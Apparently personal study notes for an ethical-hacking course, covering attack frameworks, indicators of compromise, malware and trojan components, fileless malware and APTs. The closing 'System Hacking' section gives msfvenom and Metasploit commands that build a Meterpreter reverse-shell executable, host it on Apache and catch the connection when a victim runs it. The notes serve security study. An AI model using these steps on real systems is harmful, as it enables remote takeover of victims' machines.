#### Electronic warfare: 
* Electronic warfare uses radio electronic and cryptographic techniques to degrade communication. Radio electronic techniques attack the physical means of sending information, whereas cryptographic techniques use bits and bytes to disrupt the means of sending information.


# ATTACK FRAMEWORKS

## 1. Cyber Kill Chain: 
    Reconnaissance
    Weaponisation
    Delivery
    Exploitation
    Installation
    Command and Control
    Actions on Objectives


## 2. MITRE ATT&CK FRAMEWORK
### PRE-ATT&CK Techniques:
    Recon
    Weaponize
### Enterprise ATT&CK Techniques:
    Deliver
    Exploit
    Control
    Execute
    Maintain

## 3. Diamond Model
### Essential Features
    Adversary
    Capability
    Victim
    Infrastructure

### Meta-Features
    1. Timestamp
    2. Phase
    3. Result
    4. Direction:
        Direction of attack eg. how adversary was routed to victim

    5. Methodology: 
        Technique use dby adversary/overall class of action eg. Phishing, DDoS, drive-by etc
    6. Resource: 
        Tools or tech used for the attack

#### Host-Based Indicators: 
Host-based indicators are found by performing an analysis of the infected system within the organizational network. Examples of host-based indicators include filenames, file hashes, registry keys, DLLs, and mutex

#### Behavioral Indicators: 
Behavioral IoCs are used to identify specific behavior related to malicious activities such as code injection into the memory or running an application's scripts. Well-defined behaviors enable broad protection to block all current and future malicious activities


# MODULE 7: MALWARE

## Techniques used to distribute malware
    Increasingly popular method is Search Engine Optimization (SEO): This is where attackers ensure their page comes out on top of search results

## Trojan Components

**Crypter**: *Software that protects against reverse engineering* 

**Downloader**: *Trojan that download other malware onto host*

**Dropper**: *Trojan that **covertly installs** other malware in system*

**Wrapper**: *Binds Trojan executable with genuine looking EXE*

**Exploit**: *Exploit.**The exploit carries the payload***

**Injector**: *Program that injects exploits or malicious code in malware into other vulnerable running processes and changes method of execution to hide or prevent removal*

**Obfuscator**: *Program that conceals malicious code of malware*

**Packer**: *Software that compresses malware file to convert code and data into unreadable format*

**Payload**: *Payload. The item which actually does the damage. **The exploit carries the payload***

**Malicious Code**: *Fundamental code that defines basic functionality of malware. May take form of Java Applets, ActiveX Controls, Browser Plugins etc*

### Types of Trojans

<img src='IMAGES/TrojanTypes.png'>


## Viruses

### Stages of Virus Lifecycle
<img src='IMAGES/VirusLifecycle.png'>


### Types of Viruses
<img src='IMAGES/VirusTypes.png'>

    Metamorphic viruses are more effective than polymorphic viruses. 
    
    Polymorphic viruses modify their code for each replication to avoid detection.

    Metamorphic viruses are programmed to rewrite themselves completely each time they reinfect a file.
---

## Fileless Malware

Malware that resides in RAM, and **executes in RAM**. Leaves no trace/detection method. Infects legitimate software and appplications via vulnerabilities.

<img src='IMAGES/FilelessMalware.png'>

> Type 1: EG. Receiving malicious packets that exploits vulnerability which automatically installs backdoor.

> Type 2: EG. Injecting malicious PS command into WMI repo to configure filter

> Type 3: Exploiting documents with embedded macro, or EXE files to inject malicious payloads into host

## Advanced Persistent Threats (APT)

Generally in the system for long periods of time. Plenty of other characteristics; refer to diagram.



> **APT Lifecycle**: Preparation, Initial Intrusion, Expansion, Persistence, Search & Exfiltration, Cleanup
<img src='IMAGES/APTLifecycle.png'>


# SYSTEM HACKING
Writing of payloads with MSFVenom. LHOST is host (attacker) machine.
**REMEMBER TO CHANGE PERMISSIONS WITH CHOWN/CHMOD FOR ALL FILES, EVEN APACHE**

    
    msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe

Creating of *share* folder of Apache directory.

    /var/www/html/share

Changing of permissions for the share folder.

     chown -R www-data:www-data /var/www/html/share


Copy over the payload into the *share* folder

Starting of Apache Server.

    service apache2 start

Enabling listener via msfconsole, use handler exploit.

     use exploit/multi/handler

Set the correct payload since default payload may not be correct. In this case, it is setting payload to *reverse_tcp*. 

    set payload windows/meterpreter/reverse_tcp

Check and set *options* such as LHOST, LPORT etc. Start exploit after to start listener.

Access LHOST IP/Port in victim machine and download the payload, and execute to connect to listener.

